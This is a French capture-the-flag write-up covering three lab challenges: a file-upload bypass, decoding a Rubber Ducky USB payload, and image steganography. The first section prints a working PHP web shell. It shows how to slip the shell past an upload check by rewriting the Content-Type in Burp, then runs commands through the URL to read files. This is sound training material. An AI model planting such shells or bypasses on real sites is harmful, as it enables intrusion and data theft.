# Secu
### 1 . Upload_medium
Il faut tout d'abord créer un fichier en `.php` comme par exemple, `payload.php`.
Ce dossier devra contenir les lignes suivantes :
```
<?php
echo shell_exec($_GET['cmd']);
?>*
```
Ensuite, nous avant de l'upload, nous utiliserons une extension de navigateur comme par exemple Foxy proxy et le logiciel Burp afin de pouvoir changer le fichier envoyé.
Grace a burp, nous devons modifier la ligne :
`Content-Type: application/octet-stream`
par :
`Content-Type: image/png`
Il faut ensuite appuyer sur forward dans Burp.
et enfin désactiver notre proxy.

On arrive sur la partie délicate, il faut ouvrir le fichier étant apparu sur la page.
Grace au php, nous avons accès au cmd depuis le lien du site, il suffit de le modifier un peu:
`http://ctf-labo.cyber-stuff.net/upload_medium/uploads/test.php?cmd=`

donc il suffit de mettre:
`ls` qui permet de lire le dossier
`%20` qui place des espaces
`-la` qui permet de voir les fichiers cachés
`../` qui permet de revenir en arrière

dans un vrai cmd, la commande nous donnerais:
`ls -la ../../`
et parmis les fichiers, nous voyeons un dossier qui s'appelle `.flag`

ensuite, nous remplaçons `ls -la` (ls%20-la) par `cat%20` et on rajoute a la fin le nom du fichier, se qui nous ouvre le fichier avec le flag a l'intérieur

`http://ctf-labo.cyber-stuff.net/upload_medium/uploads/test.php?cmd=cat%20../../.flag`




* 2 . The DSI's yellow usb key

Le rubber ducky hack, est donc un fichier intégré a une clef USB qui tape des commandes a notre place, ce qui permet de rapidement pirater une session laissée ouverte.

Donc une fois le fichier donné téléchargé, il faut d'abord le décomprésser (comme Winrar ou 7-zip)

et vous optenez un fichier `.dd`

Sous mac, il suffit d'entrer la commande 
`hdiutil attach -imagekey diskimage-class=CRawDiskImage dump.dd`
se qui nous donne un fichier `inject.bin`
et ensuite, nous utilisons un site afin de décoder le fichier inject.bin : 
`https://ducktoolkit.com/decoder/`

le decodage nous donne l'adresse d'un fichier exe qui est en faite un .txt contenant le flag


* 3 . I Lowe runnig

Cette fois si, c'est plutôt simple, il suffit de télécharger l'image et de l'upload sur ce site : 
`https://incoherency.co.uk/image-steganography/#unhide`
L'image contenait un texte caché étant donc le flag.